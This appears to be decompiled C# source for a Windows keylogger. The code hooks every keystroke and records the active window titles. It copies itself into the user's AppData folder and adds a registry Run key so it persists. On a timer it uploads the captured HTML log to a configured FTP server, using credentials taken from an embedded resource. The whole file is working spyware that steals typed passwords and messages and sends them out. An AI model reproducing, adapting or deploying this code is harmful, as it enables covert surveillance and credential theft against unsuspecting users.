using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace keylogger;

internal class Program
{
	public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);

	public struct keyboardHookStruct
	{
		public int vkCode;

		public int scanCode;

		public int flags;

		public int time;

		public int dwExtraInfo;
	}

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private const int WM_KEYUP = 257;

	private const int WM_SYSKEYDOWN = 260;

	private const int WM_SYSKEYUP = 261;

	private static readonly keyboardHookProc staticKeyboardHookProc = hookProc;

	private static IntPtr hhook = IntPtr.Zero;

	private static IntPtr hCurrentWindow = IntPtr.Zero;

	private static string Log = string.Empty;

	private static string windowTitle = string.Empty;

	private static byte shift = 0;

	private static int ti = 777;

	private static string rv = string.Empty;

	private static string fl = string.Empty;

	private static string fu = string.Empty;

	private static string fp = string.Empty;

	private static string fn = string.Empty;

	[DllImport("user32.dll")]
	private static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);

	[DllImport("user32.dll")]
	private static extern bool UnhookWindowsHookEx(IntPtr hInstance);

	[DllImport("user32.dll")]
	private static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string lpFileName);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

	private static void Main()
	{
		bool flag = true;
		ResourceManager resourceManager = new ResourceManager("file", Assembly.GetExecutingAssembly());
		string @string = resourceManager.GetString("file");
		ti = int.Parse(@string.Split(new char[1] { '|' })[0]);
		fl = @string.Split(new char[1] { '|' })[1];
		fu = @string.Split(new char[1] { '|' })[2];
		fp = @string.Split(new char[1] { '|' })[3];
		rv = @string.Split(new char[1] { '|' })[4];
		fn = @string.Split(new char[1] { '|' })[5];
		IntPtr hInstance = LoadLibrary("User32");
		hhook = SetWindowsHookEx(13, staticKeyboardHookProc, hInstance, 0u);
		System.Timers.Timer timer = new System.Timers.Timer();
		timer.Elapsed += OnTimedEvent;
		timer.Interval = ti * 60000;
		timer.Enabled = true;
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + fn;
		if (!File.Exists(text))
		{
			File.Copy(fileName, text);
		}
		string subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		string name = rv;
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
		registryKey.SetValue(name, text);
		Application.Run();
		while (flag)
		{
			Thread.Sleep(1);
		}
		timer.Enabled = false;
		UnhookWindowsHookEx(hhook);
	}

	private static string Colorize(string inputstr, int keytype)
	{
		return keytype switch
		{
			1 => "<i>" + inputstr + "</i>", 
			2 => "<span style=\"color: #808080;\">" + inputstr + "</span>", 
			3 => "<span style=\"color: #000080;\">" + inputstr + "</span>", 
			4 => "<span style=\"color: #008000;\">" + inputstr + "</span>", 
			_ => inputstr, 
		};
	}

	private static void OnTimedEvent(object sender, ElapsedEventArgs e)
	{
		string empty = string.Empty;
		empty = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"></head><body>";
		empty += Log;
		empty += "</body></html>";
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		folderPath += "\\test.dat";
		using (StreamWriter streamWriter = new StreamWriter(folderPath))
		{
			streamWriter.Write(empty);
		}
		string text = fl + Environment.UserName.ToString() + "-" + Environment.MachineName.ToString();
		try
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(text);
			ftpWebRequest.Credentials = new NetworkCredential(fu, fp);
			ftpWebRequest.Method = "MKD";
			ftpWebRequest.GetResponse();
		}
		catch (WebException)
		{
		}
		FtpWebRequest ftpWebRequest2 = (FtpWebRequest)WebRequest.Create(text + "/" + DateTime.Now.ToString("HH-mm-ss_d-M-yyyy") + ".html");
		ftpWebRequest2.Credentials = new NetworkCredential(fu, fp);
		ftpWebRequest2.KeepAlive = true;
		ftpWebRequest2.UseBinary = true;
		ftpWebRequest2.UsePassive = true;
		ftpWebRequest2.Method = "STOR";
		FileStream fileStream = File.OpenRead(folderPath);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, array.Length);
		fileStream.Close();
		Stream requestStream = ftpWebRequest2.GetRequestStream();
		requestStream.Write(array, 0, array.Length);
		requestStream.Close();
		folderPath = string.Empty;
		text = string.Empty;
		Log = string.Empty;
		empty = string.Empty;
		File.Delete(folderPath);
	}

	public static int hookProc(int code, int wParam, ref keyboardHookStruct lParam)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Invalid comparison between I4 and Unknown
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0230: Expected I4, but got Unknown
		//IL_0230: Unknown result type (might be due to invalid IL or missing references)
		//IL_0236: Unknown result type (might be due to invalid IL or missing references)
		//IL_0258: Expected I4, but got Unknown
		//IL_0258: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0274: Expected I4, but got Unknown
		if (code >= 0)
		{
			Keys val = (Keys)lParam.vkCode;
			KeyEventArgs val2 = new KeyEventArgs(val);
			if (wParam == 257 || wParam == 261)
			{
				if (hCurrentWindow != GetForegroundWindow())
				{
					StringBuilder stringBuilder = new StringBuilder(256);
					hCurrentWindow = GetForegroundWindow();
					GetWindowText(hCurrentWindow, stringBuilder, stringBuilder.Capacity);
					Log = Log + "<br /><br /><strong>[ Okno: " + stringBuilder.ToString() + "]</strong><br /><br />";
				}
				if (65536 == (int)Control.get_ModifierKeys())
				{
					shift = 1;
				}
				else
				{
					shift = 0;
				}
				Keys keyCode = val2.get_KeyCode();
				switch (keyCode - 8)
				{
				default:
					switch (keyCode - 186)
					{
					default:
						switch (keyCode - 219)
						{
						case 0:
							if (shift == 0)
							{
								Log += Colorize("[", 3);
							}
							else
							{
								Log += Colorize("{", 3);
							}
							break;
						case 1:
							if (shift == 0)
							{
								Log += Colorize("\\", 3);
							}
							else
							{
								Log += Colorize("|", 3);
							}
							break;
						case 2:
							if (shift == 0)
							{
								Log += Colorize("]", 3);
							}
							else
							{
								Log += Colorize("}", 3);
							}
							break;
						case 3:
							if (shift == 0)
							{
								Log += Colorize("'", 3);
							}
							else
							{
								Log += Colorize("\"", 3);
							}
							break;
						}
						break;
					case 0:
						if (shift == 0)
						{
							Log += Colorize(";", 3);
						}
						else
						{
							Log += Colorize(":", 3);
						}
						break;
					case 1:
						if (shift == 0)
						{
							Log += Colorize("=", 3);
						}
						else
						{
							Log += Colorize("+", 3);
						}
						break;
					case 2:
						if (shift == 0)
						{
							Log += Colorize(",", 3);
						}
						else
						{
							Log += Colorize("&lt;", 3);
						}
						break;
					case 3:
						if (shift == 0)
						{
							Log += Colorize("-", 3);
						}
						else
						{
							Log += Colorize("_", 3);
						}
						break;
					case 4:
						if (shift == 0)
						{
							Log += Colorize(".", 3);
						}
						else
						{
							Log += Colorize("&gt;", 3);
						}
						break;
					case 5:
						if (shift == 0)
						{
							Log += Colorize("/", 3);
						}
						else
						{
							Log += Colorize("?", 3);
						}
						break;
					case 6:
						if (shift == 0)
						{
							Log += Colorize("`", 3);
						}
						else
						{
							Log += Colorize("~", 3);
						}
						break;
					}
					break;
				case 0:
					Log += Colorize("[Backspace]", 1);
					break;
				case 1:
					Log += Colorize("[Tab]", 1);
					break;
				case 2:
					Log += Colorize("[LineFeed]", 1);
					break;
				case 4:
					Log += Colorize("[Clear]", 1);
					break;
				case 5:
					Log += Colorize("[Enter]", 1);
					break;
				case 12:
					Log += Colorize("[CapsLock]", 1);
					break;
				case 19:
					Log += Colorize("[Escape]", 1);
					break;
				case 24:
					Log += "&nbsp;";
					break;
				case 38:
					Log += Colorize("[Delete]", 1);
					break;
				case 40:
					if (shift == 0)
					{
						Log += Colorize("0", 2);
					}
					else
					{
						Log += Colorize(")", 3);
					}
					break;
				case 41:
					if (shift == 0)
					{
						Log += Colorize("1", 2);
					}
					else
					{
						Log += Colorize("!", 3);
					}
					break;
				case 42:
					if (shift == 0)
					{
						Log += Colorize("2", 2);
					}
					else
					{
						Log += Colorize("@", 3);
					}
					break;
				case 43:
					if (shift == 0)
					{
						Log += Colorize("3", 2);
					}
					else
					{
						Log += Colorize("#", 3);
					}
					break;
				case 44:
					if (shift == 0)
					{
						Log += Colorize("4", 2);
					}
					else
					{
						Log += Colorize("$", 3);
					}
					break;
				case 45:
					if (shift == 0)
					{
						Log += Colorize("5", 2);
					}
					else
					{
						Log += Colorize("%", 3);
					}
					break;
				case 46:
					if (shift == 0)
					{
						Log += Colorize("6", 2);
					}
					else
					{
						Log += Colorize("^", 3);
					}
					break;
				case 47:
					if (shift == 0)
					{
						Log += Colorize("7", 2);
					}
					else
					{
						Log += Colorize("&amp;", 3);
					}
					break;
				case 48:
					if (shift == 0)
					{
						Log += Colorize("8", 2);
					}
					else
					{
						Log += Colorize("*", 3);
					}
					break;
				case 49:
					if (shift == 0)
					{
						Log += Colorize("9", 2);
					}
					else
					{
						Log += Colorize("(", 3);
					}
					break;
				case 57:
					if (shift == 0)
					{
						Log += Colorize("a", 4);
					}
					else
					{
						Log += Colorize("A", 4);
					}
					break;
				case 58:
					if (shift == 0)
					{
						Log += Colorize("b", 4);
					}
					else
					{
						Log += Colorize("B", 4);
					}
					break;
				case 59:
					if (shift == 0)
					{
						Log += Colorize("c", 4);
					}
					else
					{
						Log += Colorize("C", 4);
					}
					break;
				case 60:
					if (shift == 0)
					{
						Log += Colorize("d", 4);
					}
					else
					{
						Log += Colorize("D", 4);
					}
					break;
				case 61:
					if (shift == 0)
					{
						Log += Colorize("e", 4);
					}
					else
					{
						Log += Colorize("E", 4);
					}
					break;
				case 62:
					if (shift == 0)
					{
						Log += Colorize("f", 4);
					}
					else
					{
						Log += Colorize("F", 4);
					}
					break;
				case 63:
					if (shift == 0)
					{
						Log += Colorize("g", 4);
					}
					else
					{
						Log += Colorize("G", 4);
					}
					break;
				case 64:
					if (shift == 0)
					{
						Log += Colorize("h", 4);
					}
					else
					{
						Log += Colorize("H", 4);
					}
					break;
				case 65:
					if (shift == 0)
					{
						Log += Colorize("i", 4);
					}
					else
					{
						Log += Colorize("I", 4);
					}
					break;
				case 66:
					if (shift == 0)
					{
						Log += Colorize("j", 4);
					}
					else
					{
						Log += Colorize("J", 4);
					}
					break;
				case 67:
					if (shift == 0)
					{
						Log += Colorize("k", 4);
					}
					else
					{
						Log += Colorize("K", 4);
					}
					break;
				case 68:
					if (shift == 0)
					{
						Log += Colorize("l", 4);
					}
					else
					{
						Log += Colorize("L", 4);
					}
					break;
				case 69:
					if (shift == 0)
					{
						Log += Colorize("m", 4);
					}
					else
					{
						Log += Colorize("M", 4);
					}
					break;
				case 70:
					if (shift == 0)
					{
						Log += Colorize("n", 4);
					}
					else
					{
						Log += Colorize("N", 4);
					}
					break;
				case 71:
					if (shift == 0)
					{
						Log += Colorize("o", 4);
					}
					else
					{
						Log += Colorize("O", 4);
					}
					break;
				case 72:
					if (shift == 0)
					{
						Log += Colorize("p", 4);
					}
					else
					{
						Log += Colorize("P", 4);
					}
					break;
				case 73:
					if (shift == 0)
					{
						Log += Colorize("q", 4);
					}
					else
					{
						Log += Colorize("Q", 4);
					}
					break;
				case 74:
					if (shift == 0)
					{
						Log += Colorize("r", 4);
					}
					else
					{
						Log += Colorize("R", 4);
					}
					break;
				case 75:
					if (shift == 0)
					{
						Log += Colorize("s", 4);
					}
					else
					{
						Log += Colorize("S", 4);
					}
					break;
				case 76:
					if (shift == 0)
					{
						Log += Colorize("t", 4);
					}
					else
					{
						Log += Colorize("T", 4);
					}
					break;
				case 77:
					if (shift == 0)
					{
						Log += Colorize("u", 4);
					}
					else
					{
						Log += Colorize("U", 4);
					}
					break;
				case 78:
					if (shift == 0)
					{
						Log += Colorize("v", 4);
					}
					else
					{
						Log += Colorize("V", 4);
					}
					break;
				case 79:
					if (shift == 0)
					{
						Log += Colorize("w", 4);
					}
					else
					{
						Log += Colorize("W", 4);
					}
					break;
				case 80:
					if (shift == 0)
					{
						Log += Colorize("x", 4);
					}
					else
					{
						Log += Colorize("X", 4);
					}
					break;
				case 81:
					if (shift == 0)
					{
						Log += Colorize("y", 4);
					}
					else
					{
						Log += Colorize("Y", 4);
					}
					break;
				case 82:
					if (shift == 0)
					{
						Log += Colorize("z", 4);
					}
					else
					{
						Log += Colorize("Z", 4);
					}
					break;
				case 88:
					Log += Colorize("0", 2);
					break;
				case 89:
					Log += Colorize("1", 2);
					break;
				case 90:
					Log += Colorize("2", 2);
					break;
				case 91:
					Log += Colorize("3", 2);
					break;
				case 92:
					Log += Colorize("4", 2);
					break;
				case 93:
					Log += Colorize("5", 2);
					break;
				case 94:
					Log += Colorize("6", 2);
					break;
				case 95:
					Log += Colorize("7", 2);
					break;
				case 96:
					Log += Colorize("8", 2);
					break;
				case 97:
					Log += Colorize("9", 2);
					break;
				case 3:
				case 6:
				case 7:
				case 8:
				case 9:
				case 10:
				case 11:
				case 13:
				case 14:
				case 15:
				case 16:
				case 17:
				case 18:
				case 20:
				case 21:
				case 22:
				case 23:
				case 25:
				case 26:
				case 27:
				case 28:
				case 29:
				case 30:
				case 31:
				case 32:
				case 33:
				case 34:
				case 35:
				case 36:
				case 37:
				case 39:
				case 50:
				case 51:
				case 52:
				case 53:
				case 54:
				case 55:
				case 56:
				case 83:
				case 84:
				case 85:
				case 86:
				case 87:
					break;
				}
			}
		}
		return CallNextHookEx(hhook, code, wParam, ref lParam);
	}
}
